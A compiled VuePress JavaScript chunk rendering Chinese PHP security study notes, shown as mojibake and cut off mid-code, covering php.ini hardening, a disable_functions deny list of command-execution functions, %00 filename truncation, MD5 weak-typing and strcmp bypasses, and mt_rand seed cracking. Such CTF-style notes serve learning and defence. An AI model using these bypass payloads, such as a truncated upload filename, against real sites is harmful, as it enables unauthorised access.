(window.webpackJsonp=window.webpackJsonp||[]).push([[51],{777:function(s,t,a){"use strict";a.r(t);var n=a(103),e=Object(n.a)({},(function(){var s=this,t=s.$createElement,a=s._self._c||t;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h1",{attrs:{id:"phpå®‰å…¨ç›¸å…³"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#phpå®‰å…¨ç›¸å…³"}},[s._v("#")]),s._v(" PHPå®‰å…¨ç›¸å…³")]),s._v(" "),a("h1",{attrs:{id:"ä½•ä¸ºä»£ç å®¡è®¡"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#ä½•ä¸ºä»£ç å®¡è®¡"}},[s._v("#")]),s._v(" ä½•ä¸ºä»£ç å®¡è®¡ï¼Ÿ")]),s._v(" "),a("p",[s._v("ä»£ç å®¡è®¡ï¼ˆCode auditï¼‰æ˜¯ä¸€ç§ä»¥å‘ç°ç¨‹åºé”™è¯¯ï¼Œå®‰å…¨æ¼æ´å’Œè¿åç¨‹åºè§„èŒƒä¸ºç›®æ ‡çš„æºä»£ç åˆ†æã€‚")]),s._v(" "),a("p",[s._v("å†…å®¹åŒ…æ‹¬ï¼š")]),s._v(" "),a("blockquote",[a("ol",[a("li",[s._v("å‰åå°åˆ†ç¦»çš„è¿è¡Œæ¶æ„")]),s._v(" "),a("li",[s._v("WebæœåŠ¡çš„ç›®å½•æƒé™åˆ†ç±»")]),s._v(" "),a("li",[s._v("è®¤è¯ä¼šè¯ä¸åº”ç”¨å¹³å°çš„ç»“åˆ")]),s._v(" "),a("li",[s._v("æ•°æ®åº“çš„é…ç½®è§„èŒƒ")]),s._v(" "),a("li",[s._v("SQLè¯­å¥çš„ç¼–å†™è§„èŒƒ")]),s._v(" "),a("li",[s._v("WebæœåŠ¡çš„æƒé™é…ç½®")]),s._v(" "),a("li",[s._v("å¯¹æŠ—çˆ¬è™«å¼•æ“çš„å¤„ç†æªæ–½")])])]),s._v(" "),a("h1",{attrs:{id:"ä½ å®¡è®¡çš„å…³é”®ç‚¹"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#ä½ å®¡è®¡çš„å…³é”®ç‚¹"}},[s._v("#")]),s._v(" ä½ å®¡è®¡çš„å…³é”®ç‚¹ï¼Ÿ")]),s._v(" "),a("blockquote",[a("p",[a("strong",[s._v("ï¼ï¼ï¼é¦–å…ˆè¦ææ¸…æ¥šç›®å½•ç»“æ„ï¼Œç¨‹åºæœ‰å“ªäº›åŠŸèƒ½ï¼ŒæŸ¥çœ‹ config é…ç½®æ–‡ä»¶ï¼ï¼ï¼")])]),s._v(" "),a("p",[s._v("ä¸€ã€å¦‚æœæ˜¯CMSï¼Œæœç´¢å…¬å¼€æ¼æ´ï¼Œå¯¹æ¯”åŒç‰ˆæœ¬æ–‡ä»¶å·®å¼‚")]),s._v(" "),a("p",[s._v("äºŒã€æŸ¥çœ‹æ•æ„Ÿå‡½æ•°ã€å›æº¯å˜é‡ï¼Œåˆ¤æ–­å˜é‡åœ¨è°ƒç”¨å‰æ˜¯å¦ç»è¿‡å®‰å…¨è¿‡æ»¤")]),s._v(" "),a("p",[s._v("ä¸‰ã€æŸ¥çœ‹å…¬å…±å‡½æ•°ã€è¿‡æ»¤å‡½æ•°æ˜¯å¦å­˜åœ¨æ¼æ´å’Œå¯ç»•è¿‡çš„ç‚¹")]),s._v(" "),a("p",[s._v("â€‹\t\tå‡½æ•°å‘½åä¸Šä¼šåŒ…å«"),a("code",[s._v("common")]),s._v("ã€"),a("code",[s._v("function")]),s._v("ã€"),a("code",[s._v("filter")]),s._v("ã€"),a("code",[s._v("safe")]),s._v("ã€"),a("code",[s._v("check")]),s._v("ç­‰å…³é”®è¯")]),s._v(" "),a("p",[s._v("å››ã€æŸ¥çœ‹æ•æ„ŸåŠŸèƒ½ç‚¹ï¼Œæ­£å‘è¿½è¸ªå˜é‡ä¼ é€’è¿‡ç¨‹ï¼Œé‡ç‚¹å…³æ³¨ç”¨æˆ·å¯æ§å˜é‡")])]),s._v(" "),a("h1",{attrs:{id:"å‚è€ƒé“¾æ¥"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#å‚è€ƒé“¾æ¥"}},[s._v("#")]),s._v(" "),a("a",{attrs:{href:"https://wooyun.js.org/drops/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E6%80%BB%E7%BB%93.html",target:"_blank",rel:"noopener noreferrer"}},[s._v("å‚è€ƒé“¾æ¥"),a("OutboundLink")],1)]),s._v(" "),a("h1",{attrs:{id:"ä½ ç”¨ä»€ä¹ˆå·¥å…·æé«˜æ•ˆç‡"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#ä½ ç”¨ä»€ä¹ˆå·¥å…·æé«˜æ•ˆç‡"}},[s._v("#")]),s._v(" ä½ ç”¨ä»€ä¹ˆå·¥å…·æé«˜æ•ˆç‡ï¼Ÿ")]),s._v(" "),a("p",[s._v("Fortify")]),s._v(" "),a("p",[a("strong",[s._v("submileä»£ç å®¡è®¡æ’ä»¶")])]),s._v(" "),a("p",[a("a",{attrs:{href:"https://github.com/5alt/VulHint",target:"_blank",rel:"noopener noreferrer"}},[s._v("VulHint"),a("OutboundLink")],1)]),s._v(" "),a("p",[a("a",{attrs:{href:"https://github.com/WangYihang/Find-PHP-Vulnerabilities",target:"_blank",rel:"noopener noreferrer"}},[s._v("Find-PHP-Vulnerabilities"),a("OutboundLink")],1)]),s._v(" "),a("h1",{attrs:{id:"ä¸ºä»€ä¹ˆæœ‰çš„æ—¶å€™æ²¡æœ‰é”™è¯¯å›æ˜¾-ç”¨phpä¸¾ä¾‹"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#ä¸ºä»€ä¹ˆæœ‰çš„æ—¶å€™æ²¡æœ‰é”™è¯¯å›æ˜¾-ç”¨phpä¸¾ä¾‹"}},[s._v("#")]),s._v(" ä¸ºä»€ä¹ˆæœ‰çš„æ—¶å€™æ²¡æœ‰é”™è¯¯å›æ˜¾ï¼Œç”¨phpä¸¾ä¾‹")]),s._v(" "),a("blockquote",[a("p",[s._v("phpçš„é…ç½®æ–‡ä»¶php.iniè¿›è¡Œäº†ä¿®æ”¹ï¼Œdisplay_errors = On ä¿®æ”¹ä¸º display_errors = offæ—¶å€™å°±æ²¡æœ‰æŠ¥é”™æç¤ºã€‚")]),s._v(" "),a("p",[s._v("åœ¨phpè„šæœ¬å¼€å¤´æ·»åŠ error_reporting(0); ä¹Ÿå¯ä»¥è¾¾åˆ°å…³é—­æŠ¥é”™çš„ä½œç”¨")]),s._v(" "),a("p",[s._v("é™¤äº†ä¸Šé¢çš„ï¼Œè¿˜å¯ä»¥åœ¨æ‰§è¡Œè¯­å¥å‰é¢æ·»åŠ @")])]),s._v(" "),a("h1",{attrs:{id:"php-iniå¯ä»¥è®¾ç½®å“ªäº›å®‰å…¨ç‰¹æ€§"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#php-iniå¯ä»¥è®¾ç½®å“ªäº›å®‰å…¨ç‰¹æ€§"}},[s._v("#")]),s._v(" php.iniå¯ä»¥è®¾ç½®å“ªäº›å®‰å…¨ç‰¹æ€§")]),s._v(" "),a("h3",{attrs:{id:"å…³é—­é”™è¯¯å›æ˜¾"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#å…³é—­é”™è¯¯å›æ˜¾"}},[s._v("#")]),s._v(" "),a("strong",[s._v("å…³é—­é”™è¯¯å›æ˜¾")])]),s._v(" "),a("p",[s._v("é˜²æ­¢åˆ©ç”¨é”™è¯¯ä¿¡æ¯åé¦ˆè·å–ç½‘ç«™æ•æ„Ÿä¿¡æ¯")]),s._v(" "),a("h3",{attrs:{id:"è®¾ç½®open-basedir-var-www-html"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#è®¾ç½®open-basedir-var-www-html"}},[s._v("#")]),s._v(" "),a("strong",[s._v("è®¾ç½®open_basedir")]),s._v("= /var/www/html")]),s._v(" "),a("p",[s._v("é™åˆ¶ PHP è„šæœ¬èƒ½è®¿é—®çš„ç›®å½•ï¼Œä¸€å®šç¨‹åº¦ä¸‹å¯é™ä½Webshellçš„å±å®³")]),s._v(" "),a("h3",{attrs:{id:"ç¦ç”¨å±é™©å‡½æ•°"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#ç¦ç”¨å±é™©å‡½æ•°"}},[s._v("#")]),s._v(" "),a("strong",[s._v("ç¦ç”¨å±é™©å‡½æ•°")])]),s._v(" "),a("p",[s._v("å¦‚æœä¸å¸Œæœ›æ‰§è¡ŒåŒ…æ‹¬"),a("code",[s._v("system()")]),s._v("ç­‰åœ¨å†…çš„æ‰§è¡Œå‘½ä»¤çš„ PHP å‡½æ•°")]),s._v(" "),a("p",[s._v("ä»¥åŠèƒ½å¤ŸæŸ¥çœ‹ PHP ä¿¡æ¯çš„"),a("code",[s._v("phpinfo()")]),s._v("ç­‰å‡½æ•°")]),s._v(" "),a("p",[s._v("å¯ä»¥é€šè¿‡ä»¥ä¸‹è®¾ç½®ç¦æ­¢è¿™äº›å‡½æ•°")]),s._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[s._v("disable_functions "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" phpinfo"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" system"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" passthru"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" exec"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" shell_exec"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" popen"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" escapeshellarg"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" escapeshellcmd"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" proc_close"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" proc_open"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" dl\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h3",{attrs:{id:"æ‰“å¼€magic-quotes-gpcé­”æœ¯å¼•å·"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#æ‰“å¼€magic-quotes-gpcé­”æœ¯å¼•å·"}},[s._v("#")]),s._v(" "),a("strong",[s._v("æ‰“å¼€magic_quotes_gpcé­”æœ¯å¼•å·")])]),s._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[s._v("magic_quotes_gpc "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" on\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("é­”æœ¯å¼•å·è‡ªåŠ¨è¿‡æ»¤ GET/POST/COOKIE å¯ä»¥é˜²æ­¢SQLæ³¨å…¥")]),s._v(" "),a("p",[s._v("ä½†æ˜¯ php<5.4ä¸ä¼šå¤„ç†$_SERVER(client-ip/refereræ³¨å…¥)  è¯¦æƒ…å‚è§"),a("a",{attrs:{href:"https://www.seebug.org/vuldb/ssvid-30102",target:"_blank",rel:"noopener noreferrer"}},[s._v("CVE-2012-0831"),a("OutboundLink")],1)]),s._v(" "),a("h3",{attrs:{id:"å…³é—­æ³¨å†Œå…¨å±€å˜é‡"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#å…³é—­æ³¨å†Œå…¨å±€å˜é‡"}},[s._v("#")]),s._v(" "),a("strong",[s._v("å…³é—­æ³¨å†Œå…¨å±€å˜é‡")])]),s._v(" "),a("p",[s._v("åœ¨ PHP ç¯å¢ƒä¸­æäº¤çš„å˜é‡ï¼ŒåŒ…æ‹¬ä½¿ç”¨ POST æˆ–è€… GET å‘½ä»¤æäº¤çš„å˜é‡")]),s._v(" "),a("p",[s._v("éƒ½å°†è‡ªåŠ¨æ³¨å†Œä¸ºå…¨å±€å˜é‡ï¼Œèƒ½å¤Ÿè¢«ç›´æ¥è®¿é—® (PHP<5.4.0)ã€‚")]),s._v(" "),a("p",[s._v("è¿™å¯¹æœåŠ¡å™¨æ˜¯éå¸¸ä¸å®‰å…¨çš„ï¼Œåº”è¯¥å°†æ³¨å†Œå…¨å±€å˜é‡çš„é€‰é¡¹å…³é—­ï¼Œç¦æ­¢å°†æ‰€æäº¤çš„å˜é‡æ³¨å†Œä¸ºå…¨å±€å˜é‡ã€‚")]),s._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[s._v("register_globals "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" off\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h3",{attrs:{id:"å…³é—­-php-ç‰ˆæœ¬ä¿¡æ¯åœ¨-http-å¤´ä¸­çš„æ³„éœ²"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#å…³é—­-php-ç‰ˆæœ¬ä¿¡æ¯åœ¨-http-å¤´ä¸­çš„æ³„éœ²"}},[s._v("#")]),s._v(" "),a("strong",[s._v("å…³é—­ PHP ç‰ˆæœ¬ä¿¡æ¯åœ¨ HTTP å¤´ä¸­çš„æ³„éœ²")])]),s._v(" "),a("p",[s._v("ä¸ºäº†é˜²æ­¢é»‘å®¢è·å–æœåŠ¡å™¨ä¸­ PHP ç‰ˆæœ¬çš„ä¿¡æ¯ï¼Œå¯ä»¥ç¦æ­¢è¯¥ä¿¡æ¯åœ¨ HTTP å¤´éƒ¨å†…å®¹ä¸­æ³„éœ²")]),s._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[s._v("expose_php "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" off\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h3",{attrs:{id:"é”™è¯¯ä¿¡æ¯æ§åˆ¶"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#é”™è¯¯ä¿¡æ¯æ§åˆ¶"}},[s._v("#")]),s._v(" "),a("strong",[s._v("é”™è¯¯ä¿¡æ¯æ§åˆ¶")])]),s._v(" "),a("p",[s._v("ä¸€èˆ¬ PHP ç¯å¢ƒåœ¨æ²¡æœ‰è¿æ¥åˆ°æ•°æ®åº“æˆ–è€…å…¶ä»–æƒ…å†µä¸‹ä¼šæœ‰é”™è¯¯æç¤ºä¿¡æ¯")]),s._v(" "),a("p",[s._v("é”™è¯¯ä¿¡æ¯ä¸­å¯èƒ½åŒ…å« PHP è„šæœ¬å½“å‰çš„è·¯å¾„ä¿¡æ¯æˆ–è€…æŸ¥è¯¢çš„ SQL è¯­å¥ç­‰ä¿¡æ¯")]),s._v(" "),a("p",[s._v("è¿™ç±»ä¿¡æ¯å¦‚æœæš´éœ²ç»™é»‘å®¢æ˜¯ä¸å®‰å…¨çš„ï¼Œåº”è¯¥ç¦æ­¢è¯¥é”™è¯¯æç¤ºï¼š")]),s._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[s._v("display_errors "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" Off\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("å¦‚æœç¡®å®è¦æ˜¾ç¤ºé”™è¯¯ä¿¡æ¯ï¼Œä¸€å®šè¦è®¾ç½®æ˜¾ç¤ºé”™è¯¯ä¿¡æ¯çš„çº§åˆ«ã€‚")]),s._v(" "),a("p",[s._v("ä¾‹å¦‚ï¼Œåªæ˜¾ç¤ºè­¦å‘Šä»¥ä¸Šçš„é”™è¯¯ä¿¡æ¯ï¼š")]),s._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[s._v("error_reporting "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token constant"}},[s._v("E_WARNING")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token constant"}},[s._v("E_ERROR")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h3",{attrs:{id:"é”™è¯¯æ—¥å¿—"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#é”™è¯¯æ—¥å¿—"}},[s._v("#")]),s._v(" "),a("strong",[s._v("é”™è¯¯æ—¥å¿—")])]),s._v(" "),a("p",[s._v("å»ºè®®åœ¨å…³é—­é”™è¯¯æç¤ºä¿¡æ¯åï¼Œå¯¹äºé”™è¯¯ä¿¡æ¯è¿›è¡Œè®°å½•ï¼Œä¾¿äºæ’æŸ¥æœåŠ¡å™¨è¿è¡Œå¼‚å¸¸çš„åŸå› ï¼š")]),s._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[s._v("log_errors "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" On\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("åŒæ—¶ï¼Œéœ€è¦è®¾ç½®é”™è¯¯æ—¥å¿—å­˜æ”¾çš„ç›®å½•ï¼Œå°† PHP é”™è¯¯æ—¥å¿—ä¸ Apache çš„æ—¥å¿—å­˜æ”¾åœ¨åŒä¸€ç›®å½•ä¸‹ï¼š")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("error_log = /usr/local/apache2/logs/php_error.log\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("strong",[s._v("æ³¨æ„")]),s._v("ï¼š è¯¥æ–‡ä»¶å¿…é¡»è®¾ç½®å…è®¸ Apache ç”¨æˆ·æˆ–ç”¨æˆ·ç»„å…·æœ‰å†™çš„æƒé™ã€‚")]),s._v(" "),a("h1",{attrs:{id:"phpçš„-00-æˆªæ–­çš„åŸç†æ˜¯ä»€ä¹ˆ"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#phpçš„-00-æˆªæ–­çš„åŸç†æ˜¯ä»€ä¹ˆ"}},[s._v("#")]),s._v(" PHPçš„ %00 æˆªæ–­çš„åŸç†æ˜¯ä»€ä¹ˆï¼Ÿ")]),s._v(" "),a("p",[a("strong",[a("code",[s._v("å­˜åœ¨äº < 5.3.4ç‰ˆæœ¬")]),s._v("ï¼ŒGPCå…³é—­")]),s._v("ï¼Œä¸€èˆ¬åˆ©ç”¨åœ¨å¯¹æ–‡ä»¶è¿›è¡Œæ“ä½œæ—¶ï¼Œå¦‚æ–‡ä»¶ä¸Šä¼ æ—¶æ–‡ä»¶åçš„æˆªæ–­")]),s._v(" "),a("p",[s._v("å¦‚"),a("code",[s._v("filename=test.php%00.txt")]),s._v(" ä¼šè¢«æˆªæ–­æˆtest.phpï¼Œ00åé¢çš„è¢«å¿½ç•¥")]),s._v(" "),a("p",[s._v("ç³»ç»Ÿåœ¨å¯¹æ–‡ä»¶åè¯»å–æ—¶å€™ï¼Œå¦‚æœé‡åˆ°0x00,å°±ä¼šè®¤ä¸ºè¯»å–å·²ç»ç»“æŸäº†")]),s._v(" "),a("blockquote",[a("p",[s._v("å› ä¸ºPHPä½¿ç”¨Cè¯­è¨€ç¼–å†™ï¼ŒCè¯­è¨€çš„å­—ç¬¦ä¸²ç»“æŸæ ‡å¿—æ˜¯å­—ç¬¦ "),a("code",[s._v("\\0")]),s._v(" ï¼Œå®ƒçš„ASCIIç å€¼æ˜¯ 0")])]),s._v(" "),a("h1",{attrs:{id:"phpå¼±ç±»å‹"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#phpå¼±ç±»å‹"}},[s._v("#")]),s._v(" PHPå¼±ç±»å‹")]),s._v(" "),a("p",[s._v("å¦‚æœç”¨"),a("code",[s._v("==")]),s._v("æ¯”è¾ƒä¸€ä¸ªæ•°å­—å’Œå­—ç¬¦ä¸²æˆ–è€…æ¯”è¾ƒæ¶‰åŠåˆ°æ•°å­—å†…å®¹çš„å­—ç¬¦ä¸²ï¼Œåˆ™å­—ç¬¦ä¸²ä¼šè¢«è½¬æ¢æˆæ•°å€¼å¹¶ä¸”æ¯”è¾ƒæŒ‰ç…§æ•°å€¼æ¥è¿›è¡Œ")]),s._v(" "),a("p",[a("code",[s._v("0e")]),s._v("å¼€å¤´çš„å­—ç¬¦ä¸²ç­‰äº0")]),s._v(" "),a("p",[s._v("è¿›è¡Œæ¯”è¾ƒè¿ç®—æ—¶ï¼Œå¦‚æœé‡åˆ°äº†"),a("code",[s._v("0e\\d+")]),s._v("è¿™ç§å­—ç¬¦ä¸²ï¼Œå°±ä¼šå°†è¿™ç§å­—ç¬¦ä¸²è§£æä¸ºç§‘å­¦è®¡æ•°æ³•")]),s._v(" "),a("p",[a("strong",[s._v("0eå¼€å¤´çš„MD5å’ŒåŸå­—ç¬¦ä¸²ï¼ˆç”¨äºMD5ç¢°æ’ï¼‰")])]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("s878926199a\n0e545993274517709034328855841020\n\ns155964671a\n0e342768416822451524974117254469\n\ns214587387a\n0e848240448830537924465865611904\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br")])]),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("?kekeyy1"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("xxx"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),s._v("kekeyy2"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("123")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("md5()å‡½æ•°æ— æ³•å¤„ç†æ•°ç»„ï¼Œå¦‚æœä¼ å…¥çš„ä¸ºæ•°ç»„ï¼Œä¼šè¿”å›NULL")]),s._v(" "),a("p",[s._v("æ‰€ä»¥ä¸¤ä¸ªæ•°ç»„ç»è¿‡åŠ å¯†åå¾—åˆ°çš„éƒ½æ˜¯NULL,ä¹Ÿå°±æ˜¯ç›¸ç­‰çš„")]),s._v(" "),a("p",[a("strong",[s._v("å€¼ä¸ºNULLçš„MD5ï¼š")])]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("d41d8cd98f00b204e9800998ecf8427ed41d8cd98f00b204e9800998ecf8427e\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("**strcmp()ï¼š**éœ€è¦ç»™strcmp()ä¼ é€’2ä¸ªstringç±»å‹çš„å‚æ•°")]),s._v(" "),a("blockquote",[a("p",[s._v("å¦‚æœstr1å°äºstr2,è¿”å›-1ï¼Œç›¸ç­‰è¿”å›0ï¼Œå¦åˆ™è¿”å›1")]),s._v(" "),a("p",[s._v("strcmpæ¯”è¾ƒå‡ºé”™ => è¿”å›NULL => NULL==0 => get flag!")])]),s._v(" "),a("h1",{attrs:{id:"å˜é‡è¦†ç›–"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#å˜é‡è¦†ç›–"}},[s._v("#")]),s._v(" å˜é‡è¦†ç›–")]),s._v(" "),a("p",[a("strong",[s._v("$$å®¹æ˜“å¼•å‘å˜é‡è¦†ç›–")])]),s._v(" "),a("blockquote",[a("p",[s._v("$GLOBALS â€” å¼•ç”¨å…¨å±€ä½œç”¨åŸŸä¸­å¯ç”¨çš„å…¨éƒ¨å˜é‡\t\t(PHPæ‰‹å†Œ)")])]),s._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$args")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token constant"}},[s._v("GLOBALS")]),s._v(" å’Œ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("var_dump")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$$args")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" å‰é¢é‚£ä¸ª $ ç»„æˆ "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$GLOBALS")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h1",{attrs:{id:"phpä¼ªéšæœºæ•°çˆ†ç ´"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#phpä¼ªéšæœºæ•°çˆ†ç ´"}},[s._v("#")]),s._v(" PHPä¼ªéšæœºæ•°çˆ†ç ´")]),s._v(" "),a("blockquote",[a("p",[s._v("æ¯ä¸€æ¬¡è°ƒç”¨mt_rand()å‡½æ•°çš„æ—¶å€™ï¼Œéƒ½ä¼šæ£€æŸ¥ä¸€ä¸‹ç³»ç»Ÿæœ‰æ²¡æœ‰æ’­ç§")]),s._v(" "),a("p",[s._v("PHPçš„mt_rand()å‡½æ•°ç”Ÿæˆçš„éšæœºæ•°åªè·Ÿseedå’Œè°ƒç”¨è¯¥å‡½æ•°çš„æ¬¡æ•°æœ‰å…³ã€‚")])]),s._v(" "),a("p",[s._v("å½“å¾—åˆ°seedæ•°å€¼åï¼Œå°±å¯ä»¥é¢„æµ‹å‡ºæ¥ä¸‹æ¥çš„æ•°å€¼æ˜¯å¤šå°‘ï¼Œè¿™æ˜¯è¯¥å‡½æ•°çš„ä¸€ä¸ªé—®é¢˜ï¼Œå®ƒå¹¶ä¸èƒ½èµ·åˆ°ä¸€ä¸ªçœŸéšæœºæ•°çš„ä½œç”¨")]),s._v(" "),a("p",[s._v("seedè·å–éœ€è¦åˆ©ç”¨ä¸€ä¸ªçˆ†ç ´å·¥å…·ï¼š"),a("a",{attrs:{href:"https://github.com/lepiaf/php_mt_seed",target:"_blank",rel:"noopener noreferrer"}},[s._v("https"),a("OutboundLink")],1),a("a",{attrs:{href:"https://github.com/lepiaf/php_mt_seed",target:"_blank",rel:"noopener noreferrer"}},[s._v("ğŸ˜•/github.com/"),a("OutboundLink")],1),a("a",{attrs:{href:"https://github.com/lepiaf/php_mt_seed",target:"_blank",rel:"noopener noreferrer"}},[s._v("lepiaf"),a("OutboundLink")],1),a("a",{attrs:{href:"https://github.com/lepiaf/php_mt_seed",target:"_blank",rel:"noopener noreferrer"}},[s._v("/"),a("OutboundLink")],1),a("a",{attrs:{href:"https://github.com/lepiaf/php_mt_seed",target:"_blank",rel:"noopener noreferrer"}},[s._v("php_mt_seed"),a("OutboundLink")],1)]),s._v(" "),a("h2",{attrs:{id:"ä¾‹é¢˜"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#ä¾‹é¢˜"}},[s._v("#")]),s._v(" ä¾‹é¢˜ï¼š")]),s._v(" "),a("p",[s._v("æŠŠé¢˜ç›®ç»™çš„ç”Ÿæˆçš„ä¸€ç»„éšæœºæ•°çš„ç¬¬ä¸€ä¸ªæ•°ç”¨ä½œçˆ†ç ´")]),s._v(" "),a("p",[s._v("å¯èƒ½çˆ†ç ´å‡ºæ¥å¤šä¸ªç§å­ï¼Œè‡ªå·±æœ¬åœ°æµ‹è¯•ä¸‹")]),s._v(" "),a("p",[s._v("é¢˜ç›®ï¼šsrand.php")]),s._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[a("span",{pre:!0,attrs:{class:"token php language-php"}},[a("span",{pre:!0,attrs:{class:"token delimiter 